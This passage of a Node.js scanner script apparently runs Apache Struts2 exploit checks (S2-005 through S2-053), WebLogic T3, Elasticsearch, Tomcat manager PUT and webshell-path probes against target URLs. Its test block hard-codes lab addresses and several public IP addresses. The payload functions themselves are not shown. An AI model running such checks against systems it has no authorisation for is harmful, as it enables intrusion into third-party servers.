	a = "005,008,015,016,019,032,033,037,045,046,DevMode".split(g_szSplit);
	if(!obj)
	for(var k in a)
	{
		if("fnction" == typeof global["doStruts2_" + a[k]])
			global["doStruts2_" + a[k]](szUrl2);
		else runChecks(szUrl2,"struts2," + a[k]);
	}
	// doStruts2_020(g_szUrl);
	// doStruts2_052(szUrl2);
	if(-1 == szUrl2.indexOf("login.jsp"))
		fnTestStruts2(szUrl2 + "/login.jsp",obj);
	// if(!(/\/$/g.test(szUrl2)))fnTestStruts2(szUrl2 + "/");
}

if(!program.test && 0 < a.length && g_szUrl)
{
	if(program.struts2)
	{
		if(/^\d\d\d$/g.test(program.struts2))
		{
			// eval("doStruts2_" + program.struts2 + "(g_szUrl)");
			runChecks(g_szUrl,"struts2," + program.struts2);
			if(program.cmd && "string" == typeof program.cmd)
			{
				/*
				setTimeout(function()
				{
					process.exit(0);
				},20000);
				*/
			}
		}
	}
	else
	{
		getIps(g_szUrl);
		//*
		testWeblogic(g_szUrl);
		fnMyPut(g_szUrl);
		fnTestStruts2(g_szUrl)
		elasticsearch(g_szUrl);
		
		// fastjson(g_szUrl);
		
		// 测试method和伪造host
		fnTestAll();
		if(program.menu)fnCheckTa3(g_szUrl,"string" != typeof(program.menu) && "./urls/ta3menu.txt" || program.menu,"一些常见、可能存在风险url检测",'ta3menu');
		if(program.webshell)fnCheckTa3(g_szUrl,"string" != typeof(program.webshell) && "./urls/webshell.txt" || program.webshell, "webshell、木马",'webshell');
		////////////////////*/
	}
}

process.on('exit', (code) => 
{
	g_oRst.url = g_szUrl;
	g_oRst.date = require('moment')(new Date().getTime()).format('YYYY-MM-DD HH:mm:ss');
	var ss = JSON.stringify(g_oRst,null,' '),
	    md5 = require('md5');
	console.log(ss);
	fs.writeFileSync("./data/" + md5(g_szUrl) + ".txt",ss);
});

if(program.test)
{
	// fnMyPut('http://192.168.17.96:8081/manager/');
	/*
	console.log("开始内网测试");
	var a = fs.readFileSync("/Users/xiatian/C/targets.txt").toString().split(/\n/);
	for(var i in a)
		fnMyPut(a[i].trim());*/
	//*
	runChecks("http://125.71.203.122:9088/","t3,weblogic");
	runChecks("http://192.168.10.216:8082/s2-032/","struts2,045");
	doStruts2_016.call({name:null},"http://192.168.10.216:8088/S2-016/default.action");
 	doStruts2_005.call({name:null},"http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
	doStruts2_032.call({name:null},"http://192.168.10.216:8088/s2-032/memoindex.action");
	doStruts2_015.call({name:null},"http://101.89.63.203:2001/jnrst/");
	/////////////*/
	/**
	doStruts2_009(g_szUrl);
	
	// doStruts2_020(g_szUrl);
	
	doStruts2_033(g_szUrl);
	doStruts2_037(g_szUrl);
	doStruts2_DevMode(g_szUrl);

	// 文件上传测试
	doStruts2_048(g_szUrl);
	//*/
	//*
	doStruts2_001.call({name:null},"http://192.168.10.216:8088/S2-001/login.action");
	doStruts2_007.call({name:null},"http://192.168.10.216:8088/S2-007/user.action");
	doStruts2_008.call({name:null},"http://192.168.10.216:8088/S2-008/devmode.action");
	doStruts2_012.call({name:null},"http://192.168.10.216:8088/S2-012/user.action");
	doStruts2_013.call({name:null},"http://192.168.10.216:8088/S2-013/link.action");
	doStruts2_015.call({name:null},"http://192.168.10.216:8088/S2-015/");
	doStruts2_016.call({name:null},"http://192.168.10.216:8088/S2-016/default.action");
	doStruts2_019.call({name:null},"http://192.168.10.216:8088/S2-019/example/HelloWorld.action");
	doStruts2_029.call({name:null},"http://192.168.10.216:8088/S2-029/default.action");
	
	runChecks("http://192.168.10.216:8082/s2-046/doUpload.action","struts2,046");
	doStruts2_048.call({name:null},"http://192.168.10.216:8082/s2-048/integration/saveGangster.action");
	doStruts2_053.call({name:null},"http://192.168.10.216:8082/s2-053/");
	///////////*/
}
module.exports = {"doStruts2_001":doStruts2_001};
var kk = this;
for(var k in kk)
{
	if("function" == typeof kk[k])
		console.log(k);
	// else console.log(kk[k]);
}

/*
var a = fs.readFileSync("./nwTomcat.txt").toString().trim().split("\n");
for(var k in a)
{
	var s = "http://" + a[k] + "manager/";
	console.log(s);
	fnMyPut(s);
}
/////////////*/
/*
s2-045
node checkUrl.js http://192.168.24.67:22245/
s2-048
node checkUrl.js http://192.168.24.67:22244/integration/saveGangster.action
*/